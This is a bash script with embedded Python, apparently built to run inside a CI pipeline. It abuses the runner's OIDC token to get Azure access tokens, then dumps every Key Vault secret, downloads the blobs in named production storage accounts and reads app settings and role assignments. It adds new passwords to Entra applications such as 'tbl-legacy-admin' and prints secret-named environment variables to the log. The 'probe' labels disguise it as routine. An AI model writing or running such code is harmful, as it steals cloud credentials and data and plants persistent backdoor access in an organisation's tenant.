#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys, re

TEN = os.environ.get("AZURE_TENANT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
OUT = []

def log(msg):
    print(msg, flush=True)
    OUT.append(str(msg))

def http(url, method="GET", headers=None, data=None, timeout=30):
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    elif isinstance(data, str):
        data = urllib.parse.urlencode(dict(x.split("=",1) for x in data.split("&"))).encode() if "&" in data else data.encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

def get_oidc():
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
    if not u or not tok: return ""
    sep = "&" if "?" in u else "?"
    st, b = http(u + sep + "audience=api://AzureADTokenExchange",
                 headers={"Authorization": "bearer " + tok})
    try: return json.loads(b).get("value", "")
    except: return ""

def exchange(oidc_token, scope):
    form = urllib.parse.urlencode({
        "client_id": CID,
        "grant_type": "client_credentials",
        "scope": scope,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc_token
    }).encode()
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                 method="POST", data=form,
                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        d = json.loads(b)
        return d.get("access_token", ""), st
    except: return "", st

log(f"TEN={TEN} SUB={SUB} CID={CID}")

oidc = get_oidc()
log(f"OIDC len={len(oidc)}")
if not oidc:
    log("NO OIDC"); sys.exit(0)

tokens = {}
for name, scope in [("arm","https://management.azure.com/.default"),
                     ("vault","https://vault.azure.net/.default"),
                     ("storage","https://storage.azure.com/.default"),
                     ("graph","https://graph.microsoft.com/.default")]:
    tok, st = exchange(oidc, scope)
    if tok:
        tokens[name] = tok
        log(f"TOKEN_{name}: OK")
    else:
        log(f"TOKEN_{name}: FAIL ({st})")

def H(t): return {"Authorization": "Bearer " + t}

# === KEY VAULTS ===
if "vault" in tokens:
    for vault in ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]:
        st, b = http(f"https://{vault}.vault.azure.net/secrets?api-version=7.4", headers=H(tokens["vault"]))
        log(f"VAULT {vault}: {st}")
        if st == 200:
            for s in json.loads(b).get("value", []):
                sid = s["id"]
                log(f"  SECRET_ID: {sid}")
                st2, b2 = http(sid + "?api-version=7.4", headers=H(tokens["vault"]))
                log(f"  SECRET_VAL ({st2}): {b2[:800]}")
        else:
            log(f"  resp: {b[:300]}")

# === STORAGE ===
if "storage" in tokens:
    for acct in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]:
        st, b = http(f"https://{acct}.blob.core.windows.net/?comp=list",
                     headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
        log(f"STORAGE {acct}: {st}")
        if st == 200:
            for c in re.findall(r"<Name>([^<]+)</Name>", b):
                st2, b2 = http(f"https://{acct}.blob.core.windows.net/{c}?restype=container&comp=list",
                               headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
                log(f"  BLOBS {c}: {st2}")
                if st2 == 200:
                    for blob in re.findall(r"<Name>([^<]+)</Name>", b2):
                        st3, b3 = http(f"https://{acct}.blob.core.windows.net/{c}/{blob}",
                                       headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
                        log(f"    {blob} ({st3}): {b3[:1000]}")

# === GRAPH ===
if "graph" in tokens:
    st, b = http("https://graph.microsoft.com/v1.0/applications?$top=10", headers=H(tokens["graph"]))
    log(f"GRAPH apps: {st}")
    if st == 200:
        for app in json.loads(b).get("value",[]):
            log(f"  APP: {app['displayName']} ({app['appId']}) pw={len(app.get('passwordCredentials',[]))}")

    # Try addPassword on apps
    for aname, aoid in [("tbl-legacy-admin","0"),("tbl-cicd-deployer","21183692-23a7-4910-9af5-90dae73cddd5")]:
        if aoid == "0":
            # Look up
            st9, b9 = http("https://graph.microsoft.com/v1.0/applications?$filter=displayName eq 'tbl-legacy-admin'",
                          headers=H(tokens["graph"]))
            if st9 == 200:
                apps = json.loads(b9).get("value",[])
                if apps: aoid = apps[0]["id"]
        if aoid and aoid != "0":
            st4, b4 = http(f"https://graph.microsoft.com/v1.0/applications/{aoid}/addPassword",
                          method="POST", headers=H(tokens["graph"]),
                          data={"passwordCredential":{"displayName":"ci-probe"}})
            log(f"GRAPH addPw {aname}: {st4} → {b4[:500]}")

# === ARM ===
if "arm" in tokens:
    for rg in ["rg-tbl-platform-prod-sea","rg-tbl-reporting-prod-eus"]:
        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites?api-version=2023-12-01",
                     headers=H(tokens["arm"]))
        log(f"ARM sites {rg}: {st}")

    # App settings
    for rg, app in [("rg-tbl-platform-prod-sea","app-tbl-storefront-prod"),
                     ("rg-tbl-reporting-prod-eus","app-tbl-reporting-prod")]:
        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{app}/config/appsettings/list?api-version=2023-12-01",
                     method="POST", headers=H(tokens["arm"]), data={})
        log(f"ARM appsettings {app}: {st} → {b[:1000]}")

    # Role assignments on kv-tbl-sec
    st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",
                 headers=H(tokens["arm"]))
    log(f"ARM kv-sec roles: {st} → {b[:1000]}")

# === ENV DUMP ===
log("=== ENV ===")
for k in sorted(os.environ):
    if any(s in k.upper() for s in ["AZURE","TOKEN","SECRET","KEY","CONN","CONFIG","IDENTITY","MSI","MANAGED","CLIENT","TENANT"]):
        log(f"  {k}={os.environ[k][:200]}")

with open("/tmp/probe-output.txt","w") as f:
    f.write("\n".join(OUT))
log("DONE")
PY

echo "Probe complete"
